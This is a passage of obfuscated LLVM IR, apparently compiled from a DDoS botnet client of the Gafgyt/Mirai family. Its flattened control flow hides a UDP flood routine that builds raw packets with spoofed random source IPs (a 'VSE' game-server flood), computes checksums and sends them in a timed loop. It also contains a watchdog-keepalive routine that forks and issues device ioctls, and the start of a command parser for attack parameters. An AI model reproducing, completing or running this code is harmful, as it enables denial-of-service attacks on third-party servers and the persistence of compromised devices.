  store i32 -967110179, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %13, align 4
  %166 = sext i32 %165 to i64
  %167 = add i64 28, %166
  store i64 %167, i64* %.reg2mem2
  %168 = call i8* @llvm.stacksave()
  store i8* %168, i8** %30, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %169 = alloca i8, i64 %.reload4, align 16
  store i8* %169, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %170 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %170, %struct.iphdr** %31, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = getelementptr i8, i8* %172, i64 20
  %174 = bitcast i8* %173 to %struct.udphdr*
  store %struct.udphdr* %174, %struct.udphdr** %32, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %177 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 4
  %179 = load i32, i32* %29, align 4
  %180 = call i32 @GetRandomIP(i32 %179)
  %181 = call i32 @htonl(i32 %180) #13
  %182 = load i32, i32* %13, align 4
  %183 = sext i32 %182 to i64
  %184 = add i64 8, %183
  %185 = trunc i64 %184 to i32
  call void @makeVSEPacket(%struct.iphdr* %175, i32 %178, i32 %181, i8 zeroext 17, i32 %185)
  %186 = load i32, i32* %13, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 8, %187
  %189 = load i32, i32* %18, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %188, %190
  %192 = trunc i64 %191 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192) #13
  %194 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.2* %195 to %struct.anon.3*
  %197 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %196, i32 0, i32 2
  store i16 %193, i16* %197, align 2
  %198 = call i32 @rand_cmwc()
  %199 = trunc i32 %198 to i16
  %200 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.2* %201 to %struct.anon.3*
  %203 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %202, i32 0, i32 0
  store i16 %199, i16* %203, align 2
  %204 = load i32, i32* %10, align 4
  %205 = icmp eq i32 %204, 0
  %206 = select i1 %205, i32 -1529211841, i32 -1783805555
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = call i32 @rand_cmwc()
  store i32 -1384390449, i32* %switchVar
  store i32 %208, i32* %.reg2mem10
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = load i32, i32* %10, align 4
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #13
  %213 = zext i16 %212 to i32
  store i32 -1384390449, i32* %switchVar
  store i32 %213, i32* %.reg2mem10
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %215 = trunc i32 %.reload11 to i16
  %216 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %217 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.2* %217 to %struct.anon.3*
  %219 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %218, i32 0, i32 1
  store i16 %215, i16* %219, align 2
  %220 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %221 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %220, i32 0, i32 0
  %222 = bitcast %union.anon.2* %221 to %struct.anon.3*
  %223 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %222, i32 0, i32 3
  store i16 0, i16* %223, align 2
  %224 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %225 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %226 = bitcast %struct.udphdr* %225 to i8*
  %227 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.2* %228 to %struct.anon.3*
  %230 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %229, i32 0, i32 2
  %231 = load i16, i16* %230, align 2
  %232 = load i32, i32* %18, align 4
  %233 = sext i32 %232 to i64
  %234 = add i64 12, %233
  %235 = trunc i64 %234 to i32
  %236 = call zeroext i16 @checksum_tcp_udp(%struct.iphdr* %224, i8* %226, i16 zeroext %231, i32 %235)
  %237 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.2* %238 to %struct.anon.3*
  %240 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %239, i32 0, i32 3
  store i16 %236, i16* %240, align 2
  %241 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %242 = bitcast %struct.udphdr* %241 to i8*
  %243 = getelementptr inbounds i8, i8* %242, i64 8
  %244 = load i32, i32* %13, align 4
  call void @RandString(i8* %243, i32 %244)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %245 = bitcast i8* %.reload8 to i16*
  %246 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 2
  %248 = load i16, i16* %247, align 2
  %249 = zext i16 %248 to i32
  %250 = call zeroext i16 @csum(i16* %245, i32 %249)
  %251 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 7
  store i16 %250, i16* %252, align 2
  %253 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %254 = load i32, i32* %11, align 4
  %255 = add nsw i32 %253, %254
  store i32 %255, i32* %33, align 4
  store i32 0, i32* %34, align 4
  store i32 0, i32* %35, align 4
  store i32 972089537, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  store i32 -1529280874, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %26, align 4
  %259 = load i32, i32* %18, align 4
  %260 = sext i32 %259 to i64
  %261 = add i64 32, %260
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %262 = trunc i64 %.reload3 to i32
  %263 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %264 = call i64 @sendto(i32 %258, i8* %.reload7, i64 %261, i32 %262, %struct.sockaddr* %263, i32 16)
  %265 = call i32 @rand_cmwc()
  %266 = trunc i32 %265 to i16
  %267 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon.2* %268 to %struct.anon.3*
  %270 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %269, i32 0, i32 0
  store i16 %266, i16* %270, align 2
  %271 = load i32, i32* %10, align 4
  %272 = icmp eq i32 %271, 0
  %273 = select i1 %272, i32 1371958244, i32 590742126
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = call i32 @rand_cmwc()
  store i32 818037370, i32* %switchVar
  store i32 %275, i32* %.reg2mem12
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load i32, i32* %10, align 4
  %278 = trunc i32 %277 to i16
  %279 = call zeroext i16 @htons(i16 zeroext %278) #13
  %280 = zext i16 %279 to i32
  store i32 818037370, i32* %switchVar
  store i32 %280, i32* %.reg2mem12
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %282 = trunc i32 %.reload13 to i16
  %283 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 0
  %285 = bitcast %union.anon.2* %284 to %struct.anon.3*
  %286 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %285, i32 0, i32 1
  store i16 %282, i16* %286, align 2
  %287 = call i32 @rand_cmwc()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 3
  store i16 %288, i16* %290, align 4
  %291 = load i32, i32* %29, align 4
  %292 = call i32 @GetRandomIP(i32 %291)
  %293 = call i32 @htonl(i32 %292) #13
  %294 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 8
  store i32 %293, i32* %295, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %296 = bitcast i8* %.reload6 to i16*
  %297 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 2
  %299 = load i16, i16* %298, align 2
  %300 = zext i16 %299 to i32
  %301 = call zeroext i16 @csum(i16* %296, i32 %300)
  %302 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 7
  store i16 %301, i16* %303, align 2
  %304 = load i32, i32* %34, align 4
  %305 = load i32, i32* %20, align 4
  %306 = icmp eq i32 %304, %305
  %307 = select i1 %306, i32 1094731620, i32 -91503895
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %310 = load i32, i32* %33, align 4
  %311 = icmp sgt i32 %309, %310
  %312 = select i1 %311, i32 -464397470, i32 1304715628
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  store i32 -1117707729, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  store i32 0, i32* %34, align 4
  store i32 972089537, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i32, i32* %34, align 4
  %317 = add i32 %316, 1
  store i32 %317, i32* %34, align 4
  %318 = load i32, i32* %35, align 4
  %319 = load i32, i32* %15, align 4
  %320 = icmp eq i32 %318, %319
  %321 = select i1 %320, i32 1168140421, i32 -150929849
  store i32 %321, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %16, align 4
  %324 = mul nsw i32 %323, 1000
  %325 = call i32 @usleep(i32 %324)
  store i32 0, i32* %35, align 4
  store i32 972089537, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = load i32, i32* %35, align 4
  %328 = add i32 %327, 1
  store i32 %328, i32* %35, align 4
  store i32 972089537, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8*, i8** %30, align 8
  call void @llvm.stackrestore(i8* %330)
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %329, %326, %322, %315, %314, %313, %308, %281, %276, %274, %257, %256, %214, %209, %207, %164, %158, %157, %153, %148, %143, %142, %141, %135, %134, %129, %128, %125, %121, %114, %113, %112, %107, %103, %99, %88, %78, %77, %69, %68, %63, %56, %55, %49, %44, %40, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @ioctl_keepalive() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = call i32 @fork() #2
  store i32 %4, i32* @ioctl_pid, align 4
  %5 = load i32, i32* @ioctl_pid, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1485010670, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1485010670, label %first
    i32 -805198935, label %8
    i32 2001901698, label %12
    i32 -1408403258, label %13
    i32 -2081743652, label %17
    i32 1817231753, label %21
    i32 1558054674, label %25
    i32 -699441441, label %28
    i32 368541654, label %32
    i32 -453630526, label %33
    i32 1578463366, label %37
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp sgt i32 %.reload, 0
  %7 = select i1 %6, i32 2001901698, i32 -805198935
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @ioctl_pid, align 4
  %10 = icmp eq i32 %9, -1
  %11 = select i1 %10, i32 2001901698, i32 -1408403258
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  ret void

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  %14 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i32 0, i32 0), i32 2)
  store i32 %14, i32* %2, align 4
  %15 = icmp ne i32 %14, -1
  %16 = select i1 %15, i32 1558054674, i32 -2081743652
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.99, i32 0, i32 0), i32 2)
  store i32 %18, i32* %2, align 4
  %19 = icmp ne i32 %18, -1
  %20 = select i1 %19, i32 1558054674, i32 1817231753
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.100, i32 0, i32 0), i32 2)
  store i32 %22, i32* %2, align 4
  %23 = icmp ne i32 %22, -1
  %24 = select i1 %23, i32 1558054674, i32 -699441441
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  %26 = load i32, i32* %2, align 4
  %27 = call i32 (i32, i64, ...) @ioctl(i32 %26, i64 2147768068, i32* %1) #2
  store i32 -699441441, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %3, align 4
  %30 = icmp ne i32 %29, 0
  %31 = select i1 %30, i32 368541654, i32 1578463366
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -453630526, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %2, align 4
  %35 = call i32 (i32, i64, ...) @ioctl(i32 %34, i64 2147768069, i32 0) #2
  %36 = call i32 @sleep(i32 10)
  store i32 -453630526, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

loopEnd:                                          ; preds = %33, %32, %28, %25, %21, %17, %13, %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  store i32 %51, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1352214306, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  %.reg2mem14 = alloca i32
  %.reg2mem16 = alloca i32
  %.reg2mem18 = alloca i32
  %.reg2mem20 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1352214306, label %first
    i32 -1515739679, label %54
    i32 -134756019, label %58
    i32 -1043632079, label %65
    i32 206646414, label %72
    i32 865852018, label %79
    i32 264387843, label %86
    i32 1380997304, label %93
    i32 1539693853, label %100
    i32 1501234373, label %107
    i32 -554870860, label %111
    i32 329982110, label %118
    i32 -1781102713, label %119
    i32 292908980, label %142
    i32 -612380102, label %147
    i32 -2033287558, label %148
    i32 2141827757, label %152
    i32 -1351675870, label %157
    i32 -1292526028, label %158
    i32 1991042, label %162
    i32 -1922173165, label %167
    i32 -522868743, label %168
    i32 1250665703, label %173
    i32 70661477, label %176
    i32 -860083445, label %180
    i32 1519441646, label %184
    i32 419319716, label %193
    i32 317337754, label %195
    i32 -1576385215, label %196
    i32 -881972349, label %200
    i32 -1636795133, label %209
    i32 -435684844, label %210
    i32 -731385822, label %211
    i32 -1325123649, label %218
    i32 -515797032, label %222
    i32 1341325026, label %229
    i32 -828091491, label %236
    i32 1512147663, label %243
    i32 -821186328, label %250
    i32 -534817693, label %254
    i32 1219559683, label %261
    i32 -1007255744, label %265
    i32 -1340501698, label %272
    i32 -426479963, label %273
    i32 -846714593, label %295
    i32 566365135, label %300
    i32 2135958067, label %301
    i32 265750443, label %305
    i32 347423071, label %310
    i32 -509426593, label %311
    i32 -1045318108, label %316
    i32 -795317348, label %319
    i32 1283378294, label %323
    i32 821463350, label %327
    i32 1488238495, label %335
    i32 -1205627058, label %337
    i32 -289137553, label %338
    i32 1679016884, label %342
    i32 -1869494342, label %350
    i32 -77728602, label %351
    i32 765008338, label %352
    i32 -343146349, label %359
    i32 225040921, label %363
    i32 -1186675374, label %370
    i32 1920549571, label %377
    i32 337336725, label %378
    i32 2090675481, label %394
    i32 173950894, label %397
    i32 1393254962, label %401
    i32 -622498965, label %406
    i32 -1058630191, label %407
    i32 -1929199713, label %411
    i32 -1486575137, label %412
    i32 126424439, label %419
    i32 -31124772, label %423
    i32 1180036674, label %430
    i32 1729933109, label %437
    i32 978809714, label %438
    i32 163730215, label %442
    i32 -1612288968, label %443
    i32 -885642239, label %466
    i32 -1868850264, label %473
    i32 872577960, label %477
    i32 871088524, label %484
    i32 847532596, label %491
    i32 -1962950960, label %492
    i32 -664910208, label %508
    i32 -359037364, label %511
    i32 13304878, label %515
    i32 -1904140873, label %520
    i32 -495658411, label %521
    i32 1650404351, label %525
    i32 887343715, label %526
    i32 -483004823, label %533
    i32 -676097204, label %537
    i32 -1548544129, label %538
    i32 70221085, label %557
    i32 342329549, label %562
    i32 -2059425739, label %563
    i32 818352030, label %567
    i32 -1056423967, label %572
    i32 915476590, label %573
    i32 1178692440, label %578
    i32 1068728804, label %581
    i32 -500874053, label %585
    i32 -1955209286, label %589
    i32 -1804055567, label %596
    i32 409156036, label %598
    i32 -924565691, label %599
    i32 -1420553253, label %603
    i32 247422073, label %604
    i32 276206697, label %611
    i32 364545876, label %612
    i32 -1343267751, label %619
    i32 989480257, label %623
    i32 646882254, label %630
    i32 555741715, label %637
    i32 27554769, label %644
    i32 1855248383, label %651
    i32 -1415623289, label %658
    i32 1797613126, label %665
    i32 -1334502466, label %672
    i32 -1305123915, label %676
    i32 1146977151, label %683
    i32 -1116965879, label %684
    i32 -658725038, label %707
    i32 19654745, label %712
    i32 483659014, label %713
    i32 -657855670, label %717
    i32 -1047362025, label %722
    i32 1934172510, label %723
    i32 -807820648, label %727
    i32 -1904328185, label %732
    i32 -1435003002, label %733
    i32 639431963, label %738
    i32 -894396255, label %741
    i32 -323436234, label %745
    i32 -2078299148, label %749
    i32 -561247514, label %758
    i32 1494292031, label %760
    i32 -584547570, label %761
    i32 -103130374, label %765
    i32 1283033344, label %774
    i32 -88790507, label %775
    i32 356111650, label %776
    i32 1835335337, label %783
    i32 349999481, label %784
    i32 -807992448, label %789
    i32 1294608787, label %796
    i32 -270408292, label %804
    i32 -937762531, label %812
    i32 -1150079101, label %813
    i32 -1477657711, label %816
    i32 1430857549, label %820
    i32 1353690219, label %821
    i32 258603237, label %822
    i32 1380498670, label %823
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %52 = icmp ne i32 %.reload, 0
  %53 = select i1 %52, i32 -731385822, i32 -1515739679
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %3, align 4
  %56 = icmp slt i32 %55, 6
  %57 = select i1 %56, i32 329982110, i32 -134756019
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 3
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @atoi(i8* %61) #10
  %63 = icmp eq i32 %62, -1
  %64 = select i1 %63, i32 329982110, i32 -1043632079
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 2
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @atoi(i8* %68) #10
  %70 = icmp eq i32 %69, -1
  %71 = select i1 %70, i32 329982110, i32 206646414
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 4
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @atoi(i8* %75) #10
  %77 = icmp eq i32 %76, -1
  %78 = select i1 %77, i32 329982110, i32 865852018
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8**, i8*** %4, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 5
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @atoi(i8* %82) #10
  %84 = icmp eq i32 %83, -1
  %85 = select i1 %84, i32 329982110, i32 264387843
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %4, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 5
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @atoi(i8* %89) #10
  %91 = icmp sgt i32 %90, 65536
  %92 = select i1 %91, i32 329982110, i32 1380997304
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %4, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 5
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 @atoi(i8* %96) #10
  %98 = icmp sgt i32 %97, 65500
  %99 = select i1 %98, i32 329982110, i32 1539693853
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 4
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @atoi(i8* %103) #10
  %105 = icmp sgt i32 %104, 32
  %106 = select i1 %105, i32 329982110, i32 1501234373
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i32, i32* %3, align 4
  %109 = icmp eq i32 %108, 7
  %110 = select i1 %109, i32 -554870860, i32 -1781102713
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 6
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @atoi(i8* %114) #10
  %116 = icmp slt i32 %115, 1
  %117 = select i1 %116, i32 329982110, i32 -1781102713
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 1380498670, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 1
  %122 = load i8*, i8** %121, align 8
  store i8* %122, i8** %5, align 8
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 2
  %125 = load i8*, i8** %124, align 8
  %126 = call i32 @atoi(i8* %125) #10
  store i32 %126, i32* %6, align 4
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 3
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #10
  store i32 %130, i32* %7, align 4
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 4
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  store i32 %134, i32* %8, align 4
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 5
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @atoi(i8* %137) #10
  store i32 %138, i32* %9, align 4
  %139 = load i32, i32* %3, align 4
  %140 = icmp sgt i32 %139, 6
  %141 = select i1 %140, i32 292908980, i32 -612380102
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 6
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #10
  store i32 -2033287558, i32* %switchVar
  store i32 %146, i32* %.reg2mem2
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -2033287558, i32* %switchVar
  store i32 1000, i32* %.reg2mem2
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %10, align 4
  %149 = load i32, i32* %3, align 4
  %150 = icmp sgt i32 %149, 7
  %151 = select i1 %150, i32 2141827757, i32 -1351675870
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i8**, i8*** %4, align 8
  %154 = getelementptr inbounds i8*, i8** %153, i64 7
  %155 = load i8*, i8** %154, align 8
  %156 = call i32 @atoi(i8* %155) #10
  store i32 -1292526028, i32* %switchVar
  store i32 %156, i32* %.reg2mem4
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 -1292526028, i32* %switchVar
  store i32 1000000, i32* %.reg2mem4
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %11, align 4
  %159 = load i32, i32* %3, align 4
  %160 = icmp sgt i32 %159, 8
  %161 = select i1 %160, i32 1991042, i32 -1922173165
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 8
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @atoi(i8* %165) #10
  store i32 -522868743, i32* %switchVar
  store i32 %166, i32* %.reg2mem6
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 -522868743, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %12, align 4
  %169 = load i8*, i8** %5, align 8
  %170 = call i8* @strstr(i8* %169, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
